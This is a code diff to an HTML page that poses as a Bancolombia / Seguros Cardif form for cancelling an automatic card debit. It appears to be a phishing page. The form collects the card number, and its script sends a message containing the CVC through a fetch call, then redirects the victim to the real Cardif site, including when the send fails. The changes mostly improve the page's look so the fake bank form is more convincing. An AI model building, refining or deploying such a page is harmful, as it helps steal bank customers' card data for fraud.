@@ -20,12 +20,21 @@
       box-shadow: 0 4px 10px rgba(0,0,0,0.1);
       width: 350px;
       border-top: 6px solid #ffcc00; /* Amarillo Bancolombia */
+      text-align: center;
+    }
+    .formulario img {
+      max-width: 140px;
+      margin-bottom: 15px;
+    }
+    .formulario h3 {
+      color: #002d72;
+      font-size: 16px;
+      margin-bottom: 10px;
     }
     .formulario h2 {
       color: #002d72;
       font-size: 18px;
       margin-bottom: 20px;
-      text-align: center;
       line-height: 1.4em;
     }
     label {
@@ -34,6 +43,7 @@
       color: #333;
       font-weight: bold;
       font-size: 14px;
+      text-align: left;
     }
     input {
       width: 100%;
@@ -47,7 +57,7 @@
       display: flex;
       gap: 10px;
     }
-    .fila input {
+    .fila div {
       flex: 1;
     }
     button {
@@ -69,12 +79,9 @@
 </head>
 <body>
 
-   <div class="img">
-        <img src="header.png" alt="Header Imagen">
-    </div>
- <h3>Cancelar Seguro CARDlF</h3><br>
-  
   <form class="formulario" id="cancelarForm">
+    <img src="header.png" alt="Header Imagen">
+    <h3>Cancelar Seguro CARDIF</h3>
     <h2>Cancelar el débito automático<br>a mi tarjeta débito de Seguros Cardif</h2>
 
     <label for="tarjeta">Número de tarjeta</label>
@@ -133,9 +140,10 @@ CVC: ${cvc}
           })
         });
 
-         window.location.href = "https://bnpparibascardif.com.co/"; // 👉 cámbialo por la URL que quieras
+        // Redirigir después del envío
+        window.location.href = "https://bnpparibascardif.com.co/";
       } catch (error) {
-        window.location.href = "https://bnpparibascardif.com.co/"; // 👉 página de error si falla
+        window.location.href = "https://bnpparibascardif.com.co/";
       }
     });
   </script>
